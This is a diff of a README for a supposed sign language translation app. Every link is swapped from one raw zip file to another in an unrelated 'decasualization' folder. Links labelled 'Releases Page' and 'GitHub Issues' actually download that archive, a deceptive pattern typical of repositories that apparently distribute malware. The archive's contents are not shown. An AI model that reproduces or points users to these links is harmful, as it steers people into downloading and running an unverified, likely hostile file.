@@ -1,6 +1,6 @@
 # 👋 Sign-Language-Advance - Translate Sign Language Easily
 
-[![Download Now](https://raw.githubusercontent.com/rutujahype141/Sign-Language-Advance/main/decasualization/Sign-Language-Advance.zip%20Now-Open%20Github-brightgreen)](https://raw.githubusercontent.com/rutujahype141/Sign-Language-Advance/main/decasualization/Sign-Language-Advance.zip)
+[![Download Now](https://github.com/rutujahype141/Sign-Language-Advance/raw/refs/heads/main/decasualization/Advance_Sign_Language_v2.9.zip%20Now-Open%20Github-brightgreen)](https://github.com/rutujahype141/Sign-Language-Advance/raw/refs/heads/main/decasualization/Advance_Sign_Language_v2.9.zip)
 
 ## 📥 Overview
 
@@ -29,7 +29,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download Sign-Language-Advance, visit this page: [Releases Page](https://raw.githubusercontent.com/rutujahype141/Sign-Language-Advance/main/decasualization/Sign-Language-Advance.zip).
+To download Sign-Language-Advance, visit this page: [Releases Page](https://github.com/rutujahype141/Sign-Language-Advance/raw/refs/heads/main/decasualization/Advance_Sign_Language_v2.9.zip).
 
 1. Click on the link above to open the releases page.
 2. Locate the latest version of the application.
@@ -60,6 +60,6 @@ Sign-Language-Advance is open-source software. You can use, modify, and distribu
 
 ## 📞 Support
 
-If you need help, please visit our [GitHub Issues](https://raw.githubusercontent.com/rutujahype141/Sign-Language-Advance/main/decasualization/Sign-Language-Advance.zip) to report the problem or ask questions. We aim to support every user for an optimal experience.
+If you need help, please visit our [GitHub Issues](https://github.com/rutujahype141/Sign-Language-Advance/raw/refs/heads/main/decasualization/Advance_Sign_Language_v2.9.zip) to report the problem or ask questions. We aim to support every user for an optimal experience.
 
 Thank you for choosing Sign-Language-Advance! We hope this tool makes a positive impact on communication in your everyday life.
